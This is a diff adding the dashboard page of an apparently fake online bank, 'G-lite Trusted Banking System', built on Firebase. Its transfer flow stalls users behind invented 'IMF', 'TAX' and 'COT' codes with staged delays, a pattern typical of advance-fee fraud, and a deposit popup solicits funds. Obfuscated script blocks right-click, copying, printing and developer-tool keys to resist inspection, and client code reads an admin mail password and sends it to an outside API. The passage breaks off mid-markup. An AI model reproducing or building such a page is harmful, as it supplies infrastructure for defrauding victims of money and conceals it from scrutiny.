@@ -1,0 +1,1374 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr" data-nav-layout="vertical" data-theme-mode="light" data-header-styles="light"
+    data-menu-styles="light" data-toggled="close">
+
+<head><!-- Meta Data -->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>G-lite Trusted Banking System</title>
+    <meta name="Description" content="Bootstrap Responsive Admin Web Dashboard HTML5 Template">
+    <meta name="Author" content="Spruko Technologies Private Limited">
+    <meta name="keywords" content="G-lite Trusted Banking System">
+    <!-- Favicon -->
+    <link rel="icon" href="../logo.ico" type="image/x-icon"> <!-- Choices JS -->
+    <script src="js/choices.min.js"></script> <!-- Main Theme Js -->
+    <script src="js/main.js"></script> <!-- Bootstrap Css -->
+    <link id="style" href="css/bootstrap.min.css" rel="stylesheet"> <!-- Style Css -->
+    <link href="css/styles.css" rel="stylesheet"> <!-- Icons Css -->
+    <link href="css/icons.css" rel="stylesheet"> <!-- Node Waves Css -->
+    <link href="css/waves.min.css" rel="stylesheet"> <!-- Simplebar Css -->
+    <link href="css/simplebar.min.css" rel="stylesheet"> <!-- Color Picker Css -->
+    <link rel="stylesheet" href="css/flatpickr.min.css">
+    <link rel="stylesheet" href="css/nano.min.css"> <!-- Choices Css -->
+    <link rel="stylesheet" href="css/choices.min.css">
+    <link rel="stylesheet" href="css/jsvectormap.min.css">
+    <link rel="stylesheet" href="css/swiper-bundle.min.css">
+    <script type="text/javascript">
+        n736 = document.all; zu54 = n736 && !document.getElementById; amvl = n736 && document.getElementById; x19t = !n736 && document.getElementById; yy1v = document.layers; function x3ag(p3gr) { try { if (zu54) alert(""); } catch (e) { } if (p3gr && p3gr.stopPropagation) p3gr.stopPropagation(); return false; } function szys() { if (event.button == 2 || event.button == 3) x3ag(); } function k2s2(e) { return (e.which == 3) ? x3ag() : true; } function lyst(nx5o) { for (zbnt = 0; zbnt < nx5o.images.length; zbnt++) { nx5o.images[zbnt].onmousedown = k2s2; } for (zbnt = 0; zbnt < nx5o.layers.length; zbnt++) { lyst(nx5o.layers[zbnt].document); } } function u3o1() { if (zu54) { for (zbnt = 0; zbnt < document.images.length; zbnt++) { document.images[zbnt].onmousedown = szys; } } else if (yy1v) { lyst(document); } } function l5zr(e) { if ((amvl && event && event.srcElement && event.srcElement.tagName == "IMG") || (x19t && e && e.target && e.target.tagName == "IMG")) { return x3ag(); } } if (amvl || x19t) { document.oncontextmenu = l5zr; } else if (zu54 || yy1v) { window.onload = u3o1; } function pufu(e) { numt = e && e.srcElement && e.srcElement != null ? e.srcElement.tagName : ""; if (numt != "INPUT" && numt != "TEXTAREA" && numt != "BUTTON") { return false; } } function ye27() { return false } if (n736) { document.onselectstart = pufu; document.ondragstart = ye27; } if (document.addEventListener) { document.addEventListener('copy', function (e) { numt = e.target.tagName; if (numt != "INPUT" && numt != "TEXTAREA") { e.preventDefault(); } }, false); document.addEventListener('dragstart', function (e) { e.preventDefault(); }, false); } function zd3f(evt) { if (evt.preventDefault) { evt.preventDefault(); } else { evt.keyCode = 37; evt.returnValue = false; } } var jxsv = 1; var lgij = 2; var dc90 = 4; var th65 = new Array(); th65.push(new Array(lgij, 65)); th65.push(new Array(lgij, 67)); th65.push(new Array(lgij, 80)); th65.push(new Array(lgij, 83)); th65.push(new Array(lgij, 85)); th65.push(new Array(jxsv | lgij, 73)); th65.push(new Array(jxsv | lgij, 74)); th65.push(new Array(jxsv, 121)); th65.push(new Array(0, 123)); function kul5(evt) { evt = (evt) ? evt : ((event) ? event : null); if (evt) { var xaca = evt.keyCode; if (!xaca && evt.charCode) { xaca = String.fromCharCode(evt.charCode).toUpperCase().charCodeAt(0); } for (var lgih = 0; lgih < th65.length; lgih++) { if ((evt.shiftKey == ((th65[lgih][0] & jxsv) == jxsv)) && ((evt.ctrlKey | evt.metaKey) == ((th65[lgih][0] & lgij) == lgij)) && (evt.altKey == ((th65[lgih][0] & dc90) == dc90)) && (xaca == th65[lgih][1] || th65[lgih][1] == 0)) { zd3f(evt); break; } } } } if (document.addEventListener) { document.addEventListener("keydown", kul5, true); document.addEventListener("keypress", kul5, true); } else if (document.attachEvent) { document.attachEvent("onkeydown", kul5); }
+    </script>
+    <meta http-equiv="imagetoolbar" content="no">
+    <style type="text/css">
+        input,
+        textarea {
+            -webkit-touch-callout: default;
+            -webkit-user-select: auto;
+            -khtml-user-select: auto;
+            -moz-user-select: text;
+            -ms-user-select: text;
+            user-select: text
+        }
+
+        * {
+            -webkit-touch-callout: none;
+            -webkit-user-select: none;
+            -khtml-user-select: none;
+            -moz-user-select: -moz-none;
+            -ms-user-select: none;
+            user-select: none
+        }
+    </style>
+    <style type="text/css" media="print">
+        body {
+            display: none
+        }
+    </style> <!--[if gte IE 5]><frame></frame><![endif]-->
+
+    <script>
+        (function () {
+            // Remove duplicate viewport meta tags (sometimes frameworks inject another meta)
+            const metas = document.querySelectorAll('meta[name="viewport"]');
+            if (metas.length > 1) {
+                for (let i = 1; i < metas.length; i++) metas[i].remove();
+            }
+
+            // Ensure inputs keep font-size (works with SPA frameworks that re-render)
+            function enforceInputStyles() {
+                document.querySelectorAll('input, textarea, select, button').forEach(el => {
+                    el.style.fontSize = '16px';
+                    el.style.lineHeight = '1.2';
+                    // vendor property fallback:
+                    try { el.style.webkitTextSizeAdjust = '100%'; } catch (e) { }
+                });
+            }
+            enforceInputStyles();
+
+            // NON-PASSIVE touchstart to allow preventDefault() (important!)
+            let lastTouch = 0;
+            function touchStartHandler(e) {
+                // If multi-touch => prevent pinch
+                if (e.touches && e.touches.length > 1) {
+                    e.preventDefault();
+                }
+                // Block quick double-tap => prevents double-tap zoom
+                const now = Date.now();
+                if (now - lastTouch <= 300) {
+                    e.preventDefault();
+                }
+                lastTouch = now;
+            }
+            document.addEventListener('touchstart', touchStartHandler, { passive: false });
+
+            // Some Safari versions support gesturestart for pinch
+            function gestureStart(e) { e.preventDefault(); }
+            document.addEventListener('gesturestart', gestureStart, { passive: false });
+
+            // Block pinch during touchmove (extra protection)
+            function touchMoveHandler(e) {
+                if (e.touches && e.touches.length > 1) e.preventDefault();
+            }
+            document.addEventListener('touchmove', touchMoveHandler, { passive: false });
+
+            // Try to block Ctrl/Cmd + wheel (desktop zoom)
+            function wheelHandler(e) {
+                if (e.ctrlKey || e.metaKey) {
+                    e.preventDefault();
+                }
+            }
+            document.addEventListener('wheel', wheelHandler, { passive: false });
+
+            // Block Ctrl/Cmd + +/- or 0 key zoom shortcuts
+            function keydownHandler(e) {
+                if ((e.ctrlKey || e.metaKey) && (e.key === '+' || e.key === '-' || e.key === '=' || e.key === '0')) {
+                    e.preventDefault();
+                    e.stopImmediatePropagation();
+                }
+            }
+            document.addEventListener('keydown', keydownHandler, true);
+
+            // Re-apply when DOM changes (e.g. frameworks)
+            const mo = new MutationObserver(enforceInputStyles);
+            mo.observe(document.documentElement, { subtree: true, childList: true });
+
+            // Cleanup if needed
+            window.addEventListener('beforeunload', function () {
+                document.removeEventListener('touchstart', touchStartHandler);
+                document.removeEventListener('gesturestart', gestureStart);
+                document.removeEventListener('touchmove', touchMoveHandler);
+                document.removeEventListener('wheel', wheelHandler);
+                document.removeEventListener('keydown', keydownHandler, true);
+                mo.disconnect();
+            });
+        })();
+    </script>
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/notyf@3/notyf.min.css">
+
+    <!-- POPUP SCRIPT -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <script src="sweetalert2.min.js"></script>
+    <link rel="stylesheet" href="sweetalert2.min.css">
+
+    <script src="../config.js"></script>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+        import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js";
+        import { getFirestore, doc, getDoc, updateDoc, addDoc, collection, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+
+
+        const app = initializeApp(CONFIG.FIREBASE);
+        const auth = getAuth(app);
+        const db = getFirestore(app);
+
+        window.userData = null;
+        let adminPass = null;
+
+        // Helpers
+        function randRef(len) {
+            const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+            return Array.from({ length: len }, () => chars[Math.floor(Math.random() * chars.length)]).join("");
+        }
+        function formatCurrency(num) {
+            return Number(num).toLocaleString();
+        }
+
+        function showOverlay(message = "Processing…") {
+            const overlay = document.getElementById("overlay");
+            if (overlay) {
+                document.getElementById("overlay-text").innerText = message;
+                overlay.style.display = "flex";
+            }
+        }
+        function hideOverlay() {
+            const overlay = document.getElementById("overlay");
+            if (overlay) overlay.style.display = "none";
+        }
+
+        // Send email via backend API
+        async function sendTransactionEmail(dbUser, amount, receiver, receiverBank, description, ref) {
+            const adminSnap = await getDoc(doc(db, "admin", "admin"));
+            let adminPass = adminSnap.exists() ? adminSnap.data().pass : null;
+
+            try {
+                const payload = {
+                    bank: "G-Lite",
+                    email: dbUser.email || "",
+                    amount: String(amount),
+                    date: new Date().toLocaleString(),
+                    name: `${dbUser.firstname || ""} ${dbUser.lastname || ""}`,
+                    receiver,
+                    receiverBankName: receiverBank || "",
+                    description,
+                    status: "Successful",
+                    ref,
+                    host: "mail.assistin.online",
+                    adminEmail: "g-lite@assistin.online",
+                    pass: adminPass || "",
+                    from: "noreply@assistin.online",
+                    image: "https://tkolyezukxoefqjzhqar.supabase.co/storage/v1/object/public/logos/IMG_0307.PNG",
+                    link: "https://ge-lite.web.app/contact/index.html"
+                };
+                await fetch("https://api-sender-service-runner.vercel.app/api/bank/o_international", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload)
+                }).catch(() => { });
+            } catch (err) {
+                console.warn("sendTransactionEmail error:", err);
+            }
+        }
+
+        // Perform debit + history + email
+        async function performTransaction(userData, { amount, description, receiver, receiverBank }) {
+            try {
+                const refCode = randRef(7);
+
+                showOverlay("Recording transaction...");
+                await addDoc(collection(db, "users", userData.uid, "history"), {
+                    amount,
+                    created_at: serverTimestamp(),
+                    date: new Date().toDateString(),
+                    transactionType: "Debit",
+                    description,
+                    status: "Successful",
+                    bankName: receiverBank,
+                    name: receiver,
+                    ref: refCode,
+                    id: randRef(4),
+                    local: 'no'
+                });
+
+                showOverlay("Recording transaction...");
+                const userRef = doc(db, "users", userData.uid);
+                const newBalance = Number(userData.accountBalance || 0) - Number(amount || 0);
+                await updateDoc(userRef, { accountBalance: newBalance });
+
+                showOverlay("Recording transaction...");
+                await sendTransactionEmail(userData, amount, receiver, receiverBank, description, refCode);
+
+                hideOverlay();
+
+                await Swal.fire({
+                    icon: "success",
+                    title: "Transaction Successful",
+                    html: `<p><strong>Reference:</strong> ${refCode}</p>
+               <p><strong>Amount:</strong> ${userData.currency || ""}${formatCurrency(amount)}</p>
+               <p><strong>Receiver:</strong> ${receiver} (${receiverBank})</p>`,
+                    confirmButtonColor: "green"
+                });
+
+                document.getElementById("fmmm").reset();
+            } catch (err) {
+                hideOverlay();
+                Swal.fire({ icon: "error", title: "Transaction Failed" });
+            }
+        }
+
+        // IMF → TAX → COT Flow
+        async function runIMFTaxCotFlow(userData, txData) {
+            const imf = await Swal.fire({
+                title: "International Monetary Fund (IMF) Code",
+                html: `<p>To comply with international regulations and verify this transfer, please provide your IMF compliance code.</p>`,
+                input: "text",
+                confirmButtonColor: "green",
+                showCancelButton: true,
+                preConfirm: (code) => {
+                    if (code === userData.IMF) return true;
+                    Swal.showValidationMessage("Invalid IMF code");
+                    return false;
+                }
+            });
+            if (!imf.isConfirmed) return;
+            showOverlay("Verifying IMF Code...");
+            await new Promise(r => setTimeout(r, 5000));
+            hideOverlay();
+            const tax = await Swal.fire({
+                title: "Tax Identification (TAX) Code",
+                html: `<p>As part of cross-border taxation compliance, please provide your TAX verification code.</p>`,
+                input: "text",
+                confirmButtonColor: "green",
+                showCancelButton: true,
+                preConfirm: (code) => {
+                    if (code === userData.TAX) return true;
+                    Swal.showValidationMessage("Invalid TAX code");
+                    return false;
+                }
+            });
+            if (!tax.isConfirmed) return;
+            showOverlay("Verifying TAX Code...");
+            await new Promise(r => setTimeout(r, 7000));
+            hideOverlay();
+            const cot = await Swal.fire({
+                title: "Certificate of Transfer (COT) Authorization",
+                html: `<p>To finalize this international transfer, please enter your valid COT authorization code.</p>`,
+                input: "text",
+                confirmButtonColor: "green",
+                showCancelButton: true,
+                preConfirm: (code) => {
+                    if (code === userData.COT) return true;
+                    Swal.showValidationMessage("Invalid COT code");
+                    return false;
+                }
+            });
+            if (!cot.isConfirmed) return;
+            showOverlay("Verifying COT Code...");
+            await new Promise(r => setTimeout(r, 10000));
+
+            hideOverlay();
+            await performTransaction(userData, txData);
+        }
+
+        // Attach form handler
+        function attachTransferHandler() {
+            const form = document.getElementById("fmmm");
+            if (!form) return;
+            form.addEventListener("submit", async (e) => {
+                e.preventDefault();
+                const fd = new FormData(form);
+                const amount = Number(fd.get("amount") || 0);
+                const description = fd.get("des") || "";
+                const receiver = fd.get("fullname") || "";
+                const receiverBank = fd.get("bankaddress") || "";
+                const pin = fd.get("pin") || "";
+
+                if (!amount || amount <= 0) return Swal.fire("Invalid amount", "", "error");
+                if (!window.userData) return Swal.fire("User not loaded", "", "error");
+                if (amount > Number(window.userData.accountBalance || 0)) return Swal.fire("Insufficient funds", "", "error");
+                if (String(pin) !== String(window.userData.pin)) return Swal.fire("Incorrect pin", "", "error");
+
+                const terms = await Swal.fire({
+                    title: "Money Sending Terms and Conditions",
+                    html: `<div style="text-align:left; font-size:14px; line-height:1.5;">
+          <p><strong>1. General Provision:</strong> Funds will ordinarily be made available to the beneficiary’s account within forty-eight (48) hours.</p>
+          <p><strong>2. Right to Decline Transfers:</strong> We reserve the right to refuse or cancel any payment transfer request.</p>
+          <p><strong>3. Grounds for Rejection:</strong> A transfer may be rejected due to insufficient funds, incomplete information, or regulatory restrictions.</p>
+          <p><strong>4. Liability:</strong> We are not liable for loss/delay due to incorrect information provided by the sender.</p>
+        </div>`,
+                    icon: "info",
+                    confirmButtonText: "Agree",
+                    cancelButtonText: "Cancel",
+                    showCancelButton: true,
+                    confirmButtonColor: "green"
+                });
+                if (!terms.isConfirmed) return;
+
+                if (window.userData.transferAccess === "allow") {
+                    await performTransaction(window.userData, { amount, description, receiver, receiverBank });
+                } else {
+                    showOverlay("Processing Transaction...");
+                    setTimeout(() => {
+                        hideOverlay();
+                        runIMFTaxCotFlow(window.userData, { amount, description, receiver, receiverBank });
+                    }, 3000);
+                }
+            });
+        }
+
+        onAuthStateChanged(auth, async (user) => {
+            if (!user) return window.location.href = "../index.html";
+
+            if (user.uid === 'g-lite@assistin.online') {
+                return window.location.href = "../Admin/dash.html";
+            }
+
+            const docSnap = await getDoc(doc(db, "users", user.uid));
+            if (!docSnap.exists()) {
+                alert(`Account Restricted... Contact customer care`);
+                await signOut(auth);
+                return window.location.href = "../index.html";
+            }
+
+            const data = docSnap.data();
+            if (data.activeuser === 'deactivated') {
+                await signOut(auth);
+                alert('Your account is restricted, please contact support.');
+                return window.location.href = `blocked.html?i=${user.uid}`;
+            }
+
+            document.getElementById('openDeposit').addEventListener('click', async () => {
+                Swal.fire({
+                    showConfirmButton: false,
+                    width: 650,
+                    background: "white",
+                    html: `
+                                                <div class="popup-container">
+                                                    <h2>Deposit Instructions</h2>
+                                                    <p>
+                                                    To fund your account, please transfer the amount to the bank details below.  
+                                                    Double-check the information before making payment.  
+                                                    Use your registered name as the payment reference for faster confirmation.  
+                                                    </p>
+
+                                                    <div class="info-block">
+                                                    <div class="info-content">
+                                                        <span class="info-label">Bank Name</span>
+                                                        <span class="info-value" id="bankName">G-lite Bank</span>
+                                                    </div>
+                                                    <button class="copy-btn" onclick="copyText('bankName')">📋</button>
+                                                    </div>
+
+                                                    <div class="info-block">
+                                                    <div class="info-content">
+                                                        <span class="info-label">Account Holder</span>
+                                                        <span class="info-value" id="accountHolder">
+                                                        ${data.firstname} ${data.middlename} ${data.lastname}
+                                                        </span>
+                                                    </div>
+                                                    <button class="copy-btn" onclick="copyText('accountHolder')">📋</button>
+                                                    </div>
+
+                                                    <div class="info-block">
+                                                    <div class="info-content">
+                                                        <span class="info-label">Account Number</span>
+                                                        <span class="info-value" id="accountNumber">${data.accountNumber}</span>
+                                                    </div>
+                                                    <button class="copy-btn" onclick="copyText('accountNumber')">📋</button>
+                                                    </div>
+
+                                                    <div class="info-block">
+                                                    <div class="info-content">
+                                                        <span class="info-label">Currency</span>
+                                                        <span class="info-value" id="currency">${data.currency || 'USD'}</span>
+                                                    </div>
+                                                    <button class="copy-btn" onclick="copyText('currency')">📋</button>
+                                                    </div>
+
+                                                    <p style="font-size: 13px; color: #aaa; margin-top: 20px;">
+                                                    Deposits may take up to 1–2 business days  
+                                                    depending on your bank.
+                                                    </p>
+                                                </div>
+                                                `,
+                    didOpen: () => {
+                        window.copyText = function (id) {
+                            const text = document.getElementById(id).textContent.trim();
+                            navigator.clipboard.writeText(text).then(() => {
+                                Swal.fire({
+                                    toast: true,
+                                    icon: 'success',
+                                    title: `Copied: ${text}`,
+                                    position: 'top-end',
+                                    showConfirmButton: false,
+                                    timer: 1500,
+                                    background: '#222',
+                                    color: 'white'
+                                });
+                            });
+                        };
+                    }
+                });
+            });
+
+
+
+            // ✅ Populate UI
+            document.getElementById("pmler").src = data.profileImage || "./user.png";
+
+            const USDollar = new Intl.NumberFormat('en-US', {
+                style: 'currency',
+                currency: 'USD',
+            })
+
+            // Populate UI
+            document.getElementById("pmler2").src = !data.profileImage ? "./user.png" : data.profileImage;
+            document.getElementById("namexz").innerHTML = `${data.firstname} ${data.middlename} ${data.lastname}`;
+            document.getElementById("namexz2").innerHTML = `${data.firstname} ${data.middlename} ${data.lastname}`;
+
+            document.getElementById("accc").innerHTML = data.accountNumber;
+            document.getElementById("bbc").innerHTML = USDollar.format(data.accountBalance).substring(1);
+
+            document.getElementById('ccxxx').innerHTML = data.currency;
+            document.getElementById('ccxxx2').innerHTML = data.currency;
+
+            // ✅ Save userData globally for transaction logic
+            window.userData = { uid: user.uid, ...data };
+
+            // ✅ Attach international transfer form
+            attachTransferHandler();
+        });
+
+        window.addEventListener("DOMContentLoaded", async () => {
+            attachTransferHandler();
+        });
+    </script>
+
+
+
+</head>
+
+<body>
+
+
+    <script src="https://cdn.jsdelivr.net/npm/notyf@3/notyf.min.js"></script>
+
+    <script>
+        var notyf = new Notyf({
+            duration: 4000,
+            position: {
+                x: 'right',
+                y: 'top',
+            },
+        });
+
+    </script>
+
+
+    <div id="overlay">
+        <div class="loader"></div>
+        <div id="overlay-text">Processing Transaction…</div>
+    </div>
+
+    <div id="loader"> <img src="images/loader.svg" alt=""> </div> <!-- Loader -->
+    <div class="page"> <!-- app-header -->
+        <header class="app-header"> <!-- Start::main-header-container -->
+            <div class="main-header-container container-fluid"> <!-- Start::header-content-left -->
+                <div class="header-content-left"> <!-- Start::header-element -->
+                    <div class="header-element">
+                        <div class="horizontal-logo"> <a href="index.html" class="header-logo"> <img
+                                    src="images/desktop-logo.png" alt="logo" class="desktop-logo"> <img src="logo.PNG"
+                                    alt="logo" class="toggle-logo"> <img src="images/desktop-dark.png" alt="logo"
+                                    class="desktop-dark"> <img src="logo.PNG" alt="logo" class="toggle-dark"> </a>
+                        </div>
+                    </div> <!-- End::header-element --> <!-- Start::header-element -->
+                    <div class="header-element mx-lg-0 mx-2"> <a
+                            style="background-color: rgb(230, 230, 230); border-radius: 50px;" aria-label="Hide Sidebar"
+                            class="sidemenu-toggle header-link animated-arrow hor-toggle horizontal-navtoggle"
+                            data-bs-toggle="sidebar" href="javascript:void(0);"><span></span></a> </div>
+                    <!-- End::header-element --> <!-- Start::header-element -->
+                    <!-- End::header-element --> <!-- Start::header-element -->
+                    <div class="header-element ms-3 d-lg-block d-none my-auto"> <!-- Start::dashboards list -->
+                        <!-- End::dashboards list -->
+                    </div> <!-- End::header-element -->
+                </div> <!-- End::header-content-left --> <!-- Start::header-content-right -->
+                <ul class="header-content-right"> <!-- Start::header-element -->
+
+                    <div id="google_translate_element"> </div>
+
+                    <!-- End::header-element -->
+                    <!-- Start::header-element -->
+                    <li class="header-element cart-dropdown"> <!-- Start::header-link|dropdown-toggle --> <a
+                            href="javascript:void(0);" class="header-link dropdown-toggle" data-bs-auto-close="outside"
+                            data-bs-toggle="dropdown"> <i class="bi bi-cart2 header-link-icon"></i> <span
+                                class="badge bg-primary rounded-pill header-icon-badge" id="cart-icon-badge">0</span>
+                        </a> <!-- End::header-link|dropdown-toggle --> <!-- Start::main-header-dropdown -->
+                        <div class="main-header-dropdown dropdown-menu dropdown-menu-end" data-popper-placement="none">
+
+
+
+
+                        </div> <!-- End::main-header-dropdown -->
+                    </li> <!-- End::header-element --> <!-- Start::header-element -->
+                    <li class="header-element notifications-dropdown d-xl-block d-none">
+                        <!-- Start::header-link|dropdown-toggle --> <a href="javascript:void(0);"
+                            class="header-link dropdown-toggle" data-bs-toggle="dropdown" data-bs-auto-close="outside"
+                            id="messageDropdown" aria-expanded="false"> <i class="bi bi-bell header-link-icon"></i>
+                            <span class="header-icon-pulse bg-secondary rounded pulse pulse-secondary"></span> </a>
+                        <!-- End::header-link|dropdown-toggle --> <!-- Start::main-header-dropdown -->
+                        <div class="main-header-dropdown dropdown-menu dropdown-menu-end" data-popper-placement="none">
+                            <div class="p-3">
+                                <div class="d-flex align-items-center justify-content-between">
+                                    <p class="mb-0 fs-16">Notifications</p><span class="badge bg-secondary-transparent"
+                                        id="notifiation-data">0 Unread</span>
+                                </div>
+                            </div>
+                            <div class="dropdown-divider"></div>
+
+                            <div class="p-3 empty-header-item1 border-top">
+
+                                <div class="p-5 empty-item1 d-none">
+                                    <div class="text-center"> <span
+                                            class="avatar avatar-xl avatar-rounded bg-secondary-transparent"> <i
+                                                class="ri-notification-off-line fs-2"></i> </span>
+                                        <h6 class="fw-medium mt-3">No New Notifications</h6>
+                                    </div>
+                                </div>
+                            </div> <!-- End::main-header-dropdown -->
+                    </li> <!-- End::header-element --> <!-- Start::header-element -->
+                    <li class="header-element header-fullscreen"> <!-- Start::header-link --> <a
+                            onclick="openFullscreen();" href="javascript:void(0);" class="header-link"> <i
+                                class="bi bi-fullscreen full-screen-open header-link-icon"></i> <i
+                                class="bi bi-fullscreen-exit full-screen-close header-link-icon d-none"></i> </a>
+                        <!-- End::header-link --> </li> <!-- End::header-element --> <!-- Start::header-element -->
+                    <li class="header-element"> <!-- Start::header-link|dropdown-toggle --> <a
+                            href="javascript:void(0);" class="header-link dropdown-toggle" id="mainHeaderProfile"
+                            data-bs-toggle="dropdown" data-bs-auto-close="outside" aria-expanded="false">
+                            <div class="d-flex align-items-center">
+                                <div class="me-sm-2 me-0"> <img id="pmler" src="./user.png" alt="img"
+                                        class="avatar avatar-sm avatar-rounded"> </div>
+                                <div class="d-xl-block d-none lh-1"> <span id="namexz2"
+                                        class="fw-medium lh-1">loading...</span>
+                                </div>
+                            </div>
+                        </a> <!-- End::header-link|dropdown-toggle -->
+                        <ul class="main-header-dropdown dropdown-menu pt-0 overflow-hidden header-profile-dropdown dropdown-menu-end"
+                            aria-labelledby="mainHeaderProfile">
+                            <li><a class="dropdown-item d-flex align-items-center" href="profile.html"><i
+                                        class="bi bi-person fs-18 me-2 op-7"></i>Profile</a></li>
+
+                            <li><a class="dropdown-item d-flex align-items-center" href="../contact/index.html"><i
+                                        class="bi bi-headset fs-18 me-2 op-7"></i>Support</a></li>
+                            <li><a id="log1" class="dropdown-item d-flex align-items-center"><i
+                                        class="bi bi-box-arrow-right fs-18 me-2 op-7"></i>Log Out</a></li>
+                        </ul>
+                    </li> <!-- End::header-element --> <!-- Start::header-element -->
+                    <!-- End::header-element -->
+                </ul> <!-- End::header-content-right -->
+            </div> <!-- End::main-header-container -->
+        </header>
+        <!-- /app-header --> <!-- Start::app-sidebar -->
+        <aside class="app-sidebar sticky" id="sidebar"> <!-- Start::main-sidebar-header -->
+            <div class="main-sidebar-header"> <a href="index.html" class="header-logo">
+                    <img style="width: 100%; height: 7vh;" src="./logoblack.png" alt="logo" class="desktop-logo ">
+                    <img src="./logo.PNG" alt="logo" class="toggle-logo"> </a>
+            </div> <!-- End::main-sidebar-header --> <!-- Start::main-sidebar -->
+            <div class="main-sidebar" id="sidebar-scroll"> <!-- Start::nav -->
+                <nav class="main-menu-container nav nav-pills flex-column sub-open">
+                    <div class="slide-left" id="slide-left"> <svg xmlns="http://www.w3.org/2000/svg" fill="#7b8191"
+                            width="24" height="24" viewBox="0 0 24 24">
+                            <path d="M13.293 6.293 7.586 12l5.707 5.707 1.414-1.414L10.414 12l4.293-4.293z"></path>
+                        </svg> </div>
+
+
+
+                    <ul class="main-menu"> <!-- Start::slide -->
+                        <li class="slide has-sub"> <a href="./index.html" class="side-menu__item">
+                                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home"
+                                    width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"
+                                    fill="none" stroke-linecap="round" stroke-linejoin="round">
+                                    <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+                                    <path d="M5 12l-2 0l9 -9l9 9l-2 0" />
+                                    <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+                                    <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+                                </svg>
+
+                                <span class="side-menu__label ">Dashboards</span> </a>
+                            <ul class="slide-menu child1">
+                                <li class="slide side-menu__label1"> <a href="./index.html">Dashboards</a> </li>
+                            </ul>
+
+
+
+
+                        <li class="slide has-sub"> <a id="openDeposit" class="side-menu__item">
+                                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-wallet"
+                                    width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"
+                                    fill="none" stroke-linecap="round" stroke-linejoin="round">
+                                    <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+                                    <path
+                                        d="M17 8v-3a1 1 0 0 0 -1 -1h-10a2 2 0 0 0 0 4h12a1 1 0 0 1 1 1v3m0 4v3a1 1 0 0 1 -1 1h-12a2 2 0 0 1 -2 -2v-12" />
+                                    <path d="M20 12v4h-4a2 2 0 0 1 0 -4h4" />
+                                </svg>
+
+                                <span class="side-menu__label ">Deposit</span> </a>
+                            <ul class="slide-menu child1">
+                                <li class="slide side-menu__label1"> <a id="openDeposit">Deposit</a> </li>
+                            </ul>
+
+
+                        <li class="slide has-sub"> <a href="./local.html" class="side-menu__item">
+                                <svg xmlns="http://www.w3.org/2000/svg"
+                                    class="icon icon-tabler icon-tabler-location-bolt" width="24" height="24"
+                                    viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none"
+                                    stroke-linecap="round" stroke-linejoin="round">
+                                    <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+                                    <path d="M13.05 20.1l-3.05 -6.1l-7 -3.5a.55 .55 0 0 1 0 -1l18 -6.5l-3.312 9.173" />
+                                    <path d="M19 16l-2 3h4l-2 3" />
+                                </svg>
+                                <span class="side-menu__label ">Local Transfer</span> </a>
+                            <ul class="slide-menu child1">
+                                <li class="slide side-menu__label1"> <a href="./local.html">Local Transfer</a> </li>
+                            </ul>
+
+                        <li class="slide has-sub"> <a href="international.html" class="side-menu__item">
+                                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-world"
+                                    width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"
+                                    fill="none" stroke-linecap="round" stroke-linejoin="round">
+                                    <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+                                    <path d="M3 12a9 9 0 1 0 18 0a9 9 0 0 0 -18 0" />
+                                    <path d="M3.6 9h16.8" />
+                                    <path d="M3.6 15h16.8" />
+                                    <path d="M11.5 3a17 17 0 0 0 0 18" />
+                                    <path d="M12.5 3a17 17 0 0 1 0 18" />
+                                </svg>
+                                <span class="side-menu__label ">International Transfer</span> </a>
+                            <ul class="slide-menu child1">
+                                <li class="slide side-menu__label1"> <a href="international.html">International
+                                        Transfer</a> </li>
+                            </ul>
+
+                        <li class="slide has-sub"> <a href="history.html" class="side-menu__item"> <i
+                                    class="bi bi-layout-text-window side-menu__icon"></i> <span
+                                    class="side-menu__label ">Transaction History</span> </a>
+                            <ul class="slide-menu child1">
+                                <li class="slide side-menu__label1"> <a href="history.html">Transaction History</a>
+                                </li>
+                            </ul>
+
+                        <li class="slide has-sub"> <a href="profile.html" class="side-menu__item">
+
+                                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-settings"
+                                    width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"
+                                    fill="none" stroke-linecap="round" stroke-linejoin="round">
+                                    <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+                                    <path
